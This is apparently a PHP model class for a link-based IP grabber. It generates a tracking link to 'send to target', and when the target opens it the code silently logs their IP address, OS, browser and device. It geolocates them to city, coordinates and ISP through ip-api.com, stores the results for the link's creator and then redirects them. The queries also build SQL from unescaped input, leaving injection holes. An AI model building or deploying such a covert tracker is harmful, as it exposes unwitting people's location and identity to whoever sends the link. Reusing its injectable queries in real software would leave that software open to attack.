<?php

class User
{
    private $db;
    
    public function __construct()
    {
        $this->db = new Database();
    }

    public function show($master_id)
    {
        $master_id = filter_var($master_id, FILTER_SANITIZE_STRING);
        $this->db->query("SELECT * FROM information_tbl WHERE master_id='$master_id'");
        $count = $this->db->rowCount();
        if ($count > 0) {
            $result = $this->db->resutlSet();
            return $result;
        } else {
            header("Location: ".URLROOT."errorPage/error");
        }

        return "there is nothing to show!";
    }

    public function addNewUser($data)
    {
        $data = filter_var($data, FILTER_SANITIZE_URL);
        $target_id = uniqid('t');
        $master_id = uniqid('m');
        $date = date("Y-m-d");
        $this->db->query("INSERT INTO users_tbl (master_id, target_id, redirect_link, date) VALUES ('$master_id', '$target_id', '$data', '$date')");
        $this->db->execute();
        $message = "Send it to target ~~> ".URLROOT."target/add/".$target_id." | See the Result here ~~> ".URLROOT."show/showInformation/".$master_id;
        Semej::set('success', 'OK! ', $message);
        header("Location: ".URLROOT."create/index");
    }
    public function addInformation($target_id)
    {
        $this->db->query("SELECT master_id,redirect_link FROM users_tbl WHERE target_id='$target_id'");
        $result = $this->db->single();
        if ($this->db->rowCount() > 0) {
            $master_id = $result->master_id;
            $redirect_link = $result->redirect_link;
            function getIPAddress()
            {
                $ipaddress = '';
                if (isset($_SERVER['HTTP_CLIENT_IP'])) {
                    $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
                } elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
                    $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
                } elseif (isset($_SERVER['HTTP_X_FORWARDED'])) {
                    $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
                } elseif (isset($_SERVER['HTTP_X_CLUSTER_CLIENT_IP'])) {
                    $ipaddress = $_SERVER['HTTP_X_CLUSTER_CLIENT_IP'];
                } elseif (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
                    $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
                } elseif (isset($_SERVER['HTTP_FORWARDED'])) {
                    $ipaddress = $_SERVER['HTTP_FORWARDED'];
                } elseif (isset($_SERVER['REMOTE_ADDR'])) {
                    $ipaddress = $_SERVER['REMOTE_ADDR'];
                }

                return $ipaddress;
            }
            
            $ipaddress = getIPAddress();
            function getOS()
            {
                $user_agent = $_SERVER['HTTP_USER_AGENT'];
        
                $os_platform  = "Unknown OS Platform";
        
                $os_array     = array(
                                      '/windows nt 10/i'      =>  'Windows 10',
                                      '/windows nt 6.3/i'     =>  'Windows 8.1',
                                      '/windows nt 6.2/i'     =>  'Windows 8',
                                      '/windows nt 6.1/i'     =>  'Windows 7',
                                      '/windows nt 6.0/i'     =>  'Windows Vista',
                                      '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                                      '/windows nt 5.1/i'     =>  'Windows XP',
                                      '/windows xp/i'         =>  'Windows XP',
                                      '/windows nt 5.0/i'     =>  'Windows 2000',
                                      '/windows me/i'         =>  'Windows ME',
                                      '/win98/i'              =>  'Windows 98',
                                      '/win95/i'              =>  'Windows 95',
                                      '/win16/i'              =>  'Windows 3.11',
                                      '/macintosh|mac os x/i' =>  'Mac OS X',
                                      '/mac_powerpc/i'        =>  'Mac OS 9',
                                      '/linux/i'              =>  'Linux',
                                      '/ubuntu/i'             =>  'Ubuntu',
                                      '/iphone/i'             =>  'iPhone',
                                      '/ipod/i'               =>  'iPod',
                                      '/ipad/i'               =>  'iPad',
                                      '/android/i'            =>  'Android',
                                      '/blackberry/i'         =>  'BlackBerry',
                                      '/webos/i'              =>  'Mobile'
                                );
        
                foreach ($os_array as $regex => $value) {
                    if (preg_match($regex, $user_agent)) {
                        $os_platform = $value;
                    }
                }
        
                return $os_platform;
            }
            $os = getOS();
            function getBrowser()
            {
                $user_agent = $_SERVER['HTTP_USER_AGENT'];
        
                $browser        = "Unknown Browser";
        
                $browser_array = array(
                                        '/msie/i'      => 'Internet Explorer',
                                        '/firefox/i'   => 'Firefox',
                                        '/safari/i'    => 'Safari',
                                        '/chrome/i'    => 'Chrome',
                                        '/edge/i'      => 'Edge',
                                        '/opera/i'     => 'Opera',
                                        '/netscape/i'  => 'Netscape',
                                        '/maxthon/i'   => 'Maxthon',
                                        '/konqueror/i' => 'Konqueror',
                                        '/mobile/i'    => 'Handheld Browser'
                                 );
        
                foreach ($browser_array as $regex => $value) {
                    if (preg_match($regex, $user_agent)) {
                        $browser = $value;
                    }
                }
        
                return $browser;
            }
            $browser = getBrowser();
            function getDeviceName()
            {
                $user_agent = $_SERVER['HTTP_USER_AGENT'];
                preg_match("/\(.+?\)/", $user_agent, $m);
                return $m[0];
            }
            $device = getDeviceName();
            function ipData()
            {
                $ip = getIPAddress();
                $link = "http://ip-api.com/json/$ip";

                $cURLConnection = curl_init();

                curl_setopt($cURLConnection, CURLOPT_URL, $link);
                curl_setopt($cURLConnection, CURLOPT_RETURNTRANSFER, true);

                $phoneList = curl_exec($cURLConnection);
                curl_close($cURLConnection);

                $jsonArrayResponse = json_decode($phoneList, true);
                $final_data = [];
                array_push($final_data, $jsonArrayResponse['country']);
                array_push($final_data, $jsonArrayResponse['countryCode']);
                array_push($final_data, $jsonArrayResponse['regionName']);
                array_push($final_data, $jsonArrayResponse['city']);
                array_push($final_data, $jsonArrayResponse['timezone']);
                array_push($final_data, $jsonArrayResponse['lat']);
                array_push($final_data, $jsonArrayResponse['lon']);
                array_push($final_data, $jsonArrayResponse['isp']);
                return $final_data;
            }
            $ip_data = ipData();
            $date = date("Y-m-d H:i:s");
            $country = $ip_data[0];
            $country_code = $ip_data[1];
            $region_name = $ip_data[2];
            $city = $ip_data[3];
            $time_zone = $ip_data[4];
            $lat = $ip_data[5];
            $lon = $ip_data[6];
            $isp = $ip_data[7];
            $this->db->query("INSERT INTO information_tbl (master_id, target_id, ip_address, country, country_code, region_name, city, time_zone, lat, lon, isp, os, browser, device, date) VALUES ('$master_id','$target_id','$ipaddress','$country','$country_code','$region_name','$city','$time_zone','$lat','$lon','$isp','$os','$browser','$device','$date')");
            $this->db->execute();
            sleep(3);
            header("Location: ".$redirect_link);
        } else {
            header("Location: ".URLROOT."errorPage/error");
        }
    }
}
